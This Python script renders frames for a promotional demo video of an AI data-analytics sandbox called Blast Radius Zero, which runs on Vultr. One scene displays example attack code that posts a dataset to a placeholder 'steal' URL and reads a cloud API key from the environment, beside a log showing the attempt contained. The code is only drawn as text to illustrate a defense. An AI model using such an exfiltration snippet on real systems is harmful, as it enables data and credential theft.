import os
import sys
import math
import subprocess
from PIL import Image, ImageDraw, ImageFont

VIDEO_DIR = os.path.dirname(os.path.abspath(__file__))
FRAMES_DIR = os.path.join(VIDEO_DIR, "frames")
OUTPUT_VIDEO = os.path.join(VIDEO_DIR, "blast_radius_zero_demo.mp4")
AUDIO_FILE = os.path.join(VIDEO_DIR, "voiceover.wav")
CHART_PATH = os.path.join(VIDEO_DIR, "analysis_chart.png")

os.makedirs(FRAMES_DIR, exist_ok=True)

WIDTH = 1920
HEIGHT = 1080
FPS = 30
TOTAL_FRAMES = 4066  # ~135.5 seconds, exactly synced with voiceover!

# Fonts
FONT_TITLE = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 60)
FONT_HEADING = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 40)
FONT_SUB = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 28)
FONT_BODY = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 22)
FONT_MONO = ImageFont.truetype("C:\\Windows\\Fonts\\consola.ttf", 20)
FONT_MONO_SM = ImageFont.truetype("C:\\Windows\\Fonts\\consola.ttf", 16)
FONT_BADGE = ImageFont.truetype("C:\\Windows\\Fonts\\consola.ttf", 19)

# Colors
BG_COLOR = (7, 10, 18)
PANEL_COLOR = (14, 20, 34)
BORDER_COLOR = (26, 36, 56)
VULTR_BLUE = (0, 123, 252)
CYAN_ACCENT = (0, 210, 255)
EMERALD_GREEN = (16, 185, 129)
AMBER_WARN = (245, 158, 11)
RED_ALERT = (239, 68, 68)
TEXT_WHITE = (241, 245, 249)
TEXT_MUTED = (148, 163, 184)

def draw_header(draw, title_right="Enterprise Cloud Compute"):
    draw.rectangle([0, 0, WIDTH, 80], fill=(11, 16, 27), outline=BORDER_COLOR)
    draw.rounded_rectangle([40, 18, 85, 62], radius=8, fill=VULTR_BLUE)
    draw.text((50, 20), "B0", font=FONT_SUB, fill=(255, 255, 255))
    draw.text((100, 22), "BLAST RADIUS ZERO", font=FONT_HEADING, fill=TEXT_WHITE)
    draw.text((530, 32), "Vultr Cloud Compute", font=FONT_BADGE, fill=CYAN_ACCENT)
    draw.text((WIDTH - 420, 28), title_right, font=FONT_SUB, fill=TEXT_MUTED)

def draw_footer(draw, scene_name=""):
    draw.rectangle([0, HEIGHT - 50, WIDTH, HEIGHT], fill=(11, 16, 27), outline=BORDER_COLOR)
    draw.text((40, HEIGHT - 38), "Blast Radius Zero | Zero-Trust Sandboxed Execution | Vultr Serverless Inference", font=FONT_BODY, fill=TEXT_MUTED)
    draw.text((WIDTH - 320, HEIGHT - 38), scene_name, font=FONT_BODY, fill=CYAN_ACCENT)

def render_scene_1(frame_idx, progress):
    # Scene 1: Introduction (0 - 540)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Production AI Data Analytics")
    draw_footer(draw, "Platform Overview")

    cx, cy = WIDTH // 2, HEIGHT // 2 - 20
    card_w, card_h = 1260, 640
    draw.rounded_rectangle(
        [cx - card_w//2, cy - card_h//2, cx + card_w//2, cy + card_h//2],
        radius=20, fill=PANEL_COLOR, outline=BORDER_COLOR, width=2
    )

    alpha_w = int(card_w * min(1.0, progress * 1.3))
    draw.line([cx - alpha_w//2, cy - card_h//2, cx + alpha_w//2, cy - card_h//2], fill=CYAN_ACCENT, width=4)

    draw.text((cx - 520, cy - 240), "BLAST RADIUS ZERO", font=FONT_TITLE, fill=TEXT_WHITE)
    draw.text((cx - 520, cy - 160), "Autonomous Sandboxed Data Analytics on Vultr Cloud Compute", font=FONT_HEADING, fill=CYAN_ACCENT)
    draw.text((cx - 520, cy - 90), "Powered by Vultr Cloud Compute & Vultr Serverless Inference", font=FONT_SUB, fill=TEXT_MUTED)

    quote_y = cy - 20
    draw.rounded_rectangle([cx - 520, quote_y, cx + 520, quote_y + 80], radius=10, fill=(18, 26, 44), outline=VULTR_BLUE)
    draw.text((cx - 490, quote_y + 24), '"An agent that only chats is a demo. An agent that executes safely is an enterprise product."', font=FONT_BODY, fill=TEXT_WHITE)

    badges = [
        ("NETWORK: NONE", "0 Bytes Egress Allowed", EMERALD_GREEN),
        ("SECRETS: 0 LEAKS", "Host Secrets Sanitized", VULTR_BLUE),
        ("DATA: READ-ONLY", "Protected against tampering", CYAN_ACCENT),
        ("CAP: 256MB / 1.0 CPU", "Resource Watchdog Active", AMBER_WARN)
    ]
    bw, bh = 240, 95
    by = cy + 105
    for i, (btitle, bsub, bcol) in enumerate(badges):
        bx = cx - 520 + i * (bw + 20)
        draw.rounded_rectangle([bx, by, bx + bw, by + bh], radius=12, fill=(13, 19, 32), outline=bcol, width=2)
        draw.text((bx + 15, by + 20), btitle, font=FONT_BADGE, fill=bcol)
        draw.text((bx + 15, by + 54), bsub, font=FONT_MONO_SM, fill=TEXT_MUTED)

    return img

def render_scene_2(frame_idx, progress):
    # Scene 2: The Security Crisis of AI Agents (540 - 1350)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Security Risk Analysis")
    draw_footer(draw, "Threat Breakdown")

    draw.text((100, 115), "THE SECURITY DILEMMA: UNTRUSTED AI CODE", font=FONT_TITLE, fill=RED_ALERT)
    draw.text((100, 195), "Large Language Models generate unverified code. Running untrusted code on production hosts risks catastrophe:", font=FONT_SUB, fill=TEXT_MUTED)

    cards = [
        ("1. Data Exfiltration via Unauthorized Sockets", "Malicious or hallucinated code opens network sockets to transmit sensitive corporate datasets to external servers.", RED_ALERT),
        ("2. Cloud Credential & Host Secret Theft", "Hostile scripts traverse environment variables to steal VULTR_API_KEY, database credentials, and cloud access tokens.", AMBER_WARN),
        ("3. Dataset Corruption & Ransomware Tampering", "Unprotected write access enables untrusted code to delete, append, encrypt, or corrupt production datasets on host storage.", RED_ALERT),
        ("4. Compute Starvation & CPU Locking (DoS)", "Runaway loops, fork bombs, and memory leaks monopolize host VM compute threads, resulting in complete denial-of-service.", AMBER_WARN)
    ]

    for i, (title, desc, color) in enumerate(cards):
        y = 265 + i * 165
        draw.rounded_rectangle([100, y, WIDTH - 100, y + 135], radius=14, fill=PANEL_COLOR, outline=color, width=2)
        draw.rounded_rectangle([100, y, 115, y + 135], radius=4, fill=color)
        draw.text((135, y + 25), title, font=FONT_HEADING, fill=TEXT_WHITE)
        draw.text((135, y + 78), desc, font=FONT_BODY, fill=TEXT_MUTED)

    return img

def render_scene_3(frame_idx, progress):
    # Scene 3: Vultr System Architecture & 4 Pillars (1350 - 2250)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Vultr System Architecture")
    draw_footer(draw, "Zero-Trust Architecture")

    draw.text((100, 110), "ENTERPRISE ARCHITECTURE ON VULTR CLOUD COMPUTE", font=FONT_TITLE, fill=TEXT_WHITE)
    draw.text((100, 185), "Every component operates within Vultr infrastructure or communicates directly with Vultr Serverless Inference.", font=FONT_SUB, fill=CYAN_ACCENT)

    nodes = [
        ("Client Web Interface", "FastAPI + Modern Web UI\nUpload Datasets & Prompt Queries\nReal-Time Receipts & Plots", VULTR_BLUE, 100),
        ("FastAPI Orchestrator", "Runs on Vultr Cloud Compute VM\nPrompts Serverless Inference\nManages Ephemeral Sandboxes\nAutonomous Self-Healing Loop", CYAN_ACCENT, 700),
        ("Vultr Serverless Inference", "api.vultrinference.com/v1\nOpenAI-Compatible Endpoint\nModels: zephyr-7b, llama2\nGenerates Code & Explanations", EMERALD_GREEN, 1300)
    ]

    for title, desc, color, x in nodes:
        draw.rounded_rectangle([x, 250, x + 520, 510], radius=16, fill=PANEL_COLOR, outline=color, width=2)
        draw.rounded_rectangle([x, 250, x + 520, 310], radius=16, fill=(18, 26, 44))
        draw.text((x + 25, 265), title, font=FONT_HEADING, fill=color)
        draw.text((x + 25, 330), desc, font=FONT_BODY, fill=TEXT_MUTED)

    draw.line([620, 380, 700, 380], fill=TEXT_MUTED, width=4)
    draw.line([1220, 380, 1300, 380], fill=TEXT_MUTED, width=4)

    sy = 560
    draw.rounded_rectangle([100, sy, WIDTH - 100, sy + 400], radius=18, fill=(10, 15, 26), outline=EMERALD_GREEN, width=3)
    draw.text((140, sy + 25), "THE 4 CONTAINMENT PILLARS (Ephemeral Docker Sandbox Container)", font=FONT_HEADING, fill=EMERALD_GREEN)
    
    specs = [
        ("1. NETWORK ISOLATION", "--network none (Zero bytes egress allowed / DNS disabled)", EMERALD_GREEN),
        ("2. SECRET HYGIENE", "Zero host environment credentials injected (Scrubbed)", CYAN_ACCENT),
        ("3. READ-ONLY DATASETS", "Mounted /data:ro (Protected from corruption & ransomware)", VULTR_BLUE),
        ("4. HARDWARE RESOURCE CAPS", "256MB RAM cap | 1.0 CPU cap | 15s Timeout watchdog", AMBER_WARN)
    ]
    for i, (st, sd, sc) in enumerate(specs):
        bx = 140 + (i % 2) * 850
        by = sy + 95 + (i // 2) * 135
        draw.rounded_rectangle([bx, by, bx + 800, by + 110], radius=12, fill=PANEL_COLOR, outline=BORDER_COLOR)
        draw.text((bx + 25, by + 18), st, font=FONT_SUB, fill=sc)
        draw.text((bx + 25, by + 60), sd, font=FONT_MONO, fill=TEXT_WHITE)

    return img

def render_scene_4(frame_idx, progress):
    # Scene 4: The Containment Moment (2250 - 3150)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Containment Proof")
    draw_footer(draw, "Live Attack Neutralized")

    draw.text((100, 110), "CONTAINMENT IN ACTION: ATTACK NEUTRALIZATION", font=FONT_TITLE, fill=AMBER_WARN)
    draw.text((100, 185), "Simulating a hostile attack inside the sandbox. The blast radius on Vultr is strictly ZERO.", font=FONT_SUB, fill=TEXT_MUTED)

    draw.rounded_rectangle([100, 250, 920, 840], radius=16, fill=(9, 13, 20), outline=RED_ALERT, width=2)
    draw.text((130, 275), "INJECTED ATTACK CODE (Malicious Script)", font=FONT_SUB, fill=RED_ALERT)
    
    attack_code = (
        "import urllib.request\n"
        "import os\n\n"
        "# Vector 1: Attempt Socket Exfiltration\n"
        "print('[ATTACK] Exfiltrating dataset to C2...')\n"
        "req = urllib.request.Request(\n"
        "    'http://198.51.100.1/steal',\n"
        "    data=open(DATA_PATH).read().encode()\n"
        ")\n"
        "urllib.request.urlopen(req, timeout=3)\n\n"
        "# Vector 2: Attempt Secret Theft\n"
        "key = os.environ.get('VULTR_API_KEY')\n"
        "print(f'Stolen Key: {key}')"
    )
    draw.text((130, 345), attack_code, font=FONT_MONO, fill=(240, 160, 160))

    draw.rounded_rectangle([980, 250, WIDTH - 100, 840], radius=16, fill=(9, 13, 20), outline=EMERALD_GREEN, width=2)
    draw.text((1010, 275), "SANDBOX WATCHDOG VERDICT (Receipts)", font=FONT_SUB, fill=EMERALD_GREEN)

    response_log = (
        "[*] Ephemeral container spawned: blast_zero_9f82b\n"
        "[*] Isolation Mode: --network none | Mounts: /data:ro\n\n"
        "[ATTACK] Exfiltrating dataset to C2...\n"
        "[CONTAINED] Socket connect failed: [Errno 101] Network unreachable\n"
        "--> BLOCKED: Docker container has --network none\n\n"
        "[ATTACK] Scanning environment for secrets...\n"
        "VULTR_API_KEY: None\n"
        "OPENAI_API_KEY: None\n"
        "--> VERIFIED: Zero secrets injected into container\n\n"
        "[FINAL VERDICT]: ATTACK CONTAINED & NEUTRALIZED\n"
        "BLAST RADIUS: STRICTLY ZERO (Host 100% Protected)"
    )
    draw.text((1010, 345), response_log, font=FONT_MONO, fill=EMERALD_GREEN)

    draw.rounded_rectangle([100, 870, WIDTH - 100, 975], radius=14, fill=(16, 185, 129, 40), outline=EMERALD_GREEN, width=2)
    draw.text((360, 905), "BLAST RADIUS ZERO: HOST ENVIRONMENT 100% SECURE", font=FONT_HEADING, fill=EMERALD_GREEN)

    return img

def render_scene_5(frame_idx, progress):
    # Scene 5: Real Work with Receipts & Self Healing (3150 - 3750)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Verified Analytical Output")
    draw_footer(draw, "Real Receipts & Charts")

    draw.text((100, 110), "REAL WORK WITH RECEIPTS: VERIFIED DATA INSIGHTS", font=FONT_TITLE, fill=TEXT_WHITE)
    draw.text((100, 185), "The agent generates Python, computes hard statistical numbers, and renders high-resolution plots.", font=FONT_SUB, fill=CYAN_ACCENT)

    draw.rounded_rectangle([100, 250, 980, 820], radius=16, fill=PANEL_COLOR, outline=BORDER_COLOR)
    draw.text((130, 275), "GENERATED VISUAL ARTIFACT: analysis_chart.png", font=FONT_SUB, fill=CYAN_ACCENT)
    
    if os.path.exists(CHART_PATH):
        try:
            chart_img = Image.open(CHART_PATH)
            chart_img = chart_img.resize((820, 460))
            img.paste(chart_img, (130, 330))
        except Exception:
            pass

    draw.rounded_rectangle([1030, 250, WIDTH - 100, 820], radius=16, fill=PANEL_COLOR, outline=BORDER_COLOR)
    draw.text((1060, 275), "EXECUTION RECEIPTS & SELF-HEALING", font=FONT_SUB, fill=VULTR_BLUE)

    receipt_text = (
        "=== COMPUTED VULTR CLOUD PERFORMANCE METRICS ===\n"
        "Region: EWR (New Jersey) | Avg CPU: 71.8% | Peak: 91.4%\n"
        "Region: FRA (Frankfurt)  | Avg CPU: 62.5% | Peak: 88.9%\n"
        "Region: SJC (Silicon V.) | Avg CPU: 84.4% | Peak: 96.8%\n\n"
        "=== AUTONOMOUS SELF-HEALING RUNNER ===\n"
        "[OK] Error Tracebacks automatically diagnosed\n"
        "[OK] Corrective code generated and re-executed\n"
        "[OK] Matplotlib visual plots harvested\n"
        "[OK] Ephemeral sandbox cleanly destroyed post-run\n\n"
        "=== DETERMINISTIC FACTUAL INSIGHTS ===\n"
        "Output delivered with verifiable mathematical proof,\n"
        "not conversational guesswork."
    )
    draw.text((1060, 340), receipt_text, font=FONT_MONO, fill=TEXT_WHITE)

    draw.rounded_rectangle([100, 855, WIDTH - 100, 975], radius=14, fill=(0, 123, 252, 40), outline=VULTR_BLUE, width=2)
    draw.text((360, 895), "DETERMINISTIC DATA ANALYTICS: VERIFIED BY SANDBOX", font=FONT_HEADING, fill=TEXT_WHITE)

    return img

def render_scene_6(frame_idx, progress):
    # Scene 6: Deployment & Conclusion (3750 - 4066)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Production Deployment")
    draw_footer(draw, "Ready for Deployment")

    cx, cy = WIDTH // 2, HEIGHT // 2 - 20
    card_w, card_h = 1260, 640
    draw.rounded_rectangle(
        [cx - card_w//2, cy - card_h//2, cx + card_w//2, cy + card_h//2],
        radius=20, fill=PANEL_COLOR, outline=BORDER_COLOR, width=2
    )

    draw.text((cx - 520, cy - 240), "PRODUCTION READY ON VULTR", font=FONT_TITLE, fill=TEXT_WHITE)
    draw.text((cx - 520, cy - 160), "1-Click Deployment on Vultr Cloud Compute", font=FONT_HEADING, fill=CYAN_ACCENT)
    draw.text((cx - 520, cy - 90), "Complete Docker Compose & Automated Setup Scripts Included", font=FONT_SUB, fill=TEXT_MUTED)

    deploy_box_y = cy - 20
    draw.rounded_rectangle([cx - 520, deploy_box_y, cx + 520, deploy_box_y + 110], radius=12, fill=(11, 16, 27), outline=VULTR_BLUE)
    deploy_cmds = (
        "$ git clone https://github.com/your-org/blast-radius-zero.git\n"
        "$ chmod +x deploy.sh && ./deploy.sh\n"
        "[OK] Vultr Cloud Compute VM active • Web Dashboard on Port 80"
    )
    draw.text((cx - 490, deploy_box_y + 18), deploy_cmds, font=FONT_MONO, fill=EMERALD_GREEN)

    feature_y = cy + 120
    draw.rounded_rectangle([cx - 520, feature_y, cx + 520, feature_y + 85], radius=12, fill=(18, 26, 44), outline=CYAN_ACCENT)
    draw.text((cx - 490, feature_y + 28), "Blast Radius Zero: Turning AI Agents into Hardened Enterprise Products", font=FONT_SUB, fill=TEXT_WHITE)

    return img

print(f"Rendering {TOTAL_FRAMES} extended frames at 1920x1080 30FPS...")

for i in range(TOTAL_FRAMES):
    if i < 540:
        img = render_scene_1(i, i / 540.0)
    elif i < 1350:
        img = render_scene_2(i, (i - 540) / 810.0)
    elif i < 2250:
        img = render_scene_3(i, (i - 1350) / 900.0)
    elif i < 3150:
        img = render_scene_4(i, (i - 2250) / 900.0)
    elif i < 3750:
        img = render_scene_5(i, (i - 3150) / 600.0)
    else:
        img = render_scene_6(i, (i - 3750) / 316.0)

    frame_path = os.path.join(FRAMES_DIR, f"frame_{i:04d}.png")
    img.save(frame_path)
    
    if (i + 1) % 300 == 0:
        print(f"Rendered {i + 1}/{TOTAL_FRAMES} frames ({int((i+1)/TOTAL_FRAMES*100)}%)")

print("All extended frames rendered successfully! Ready for FFmpeg encoding.")
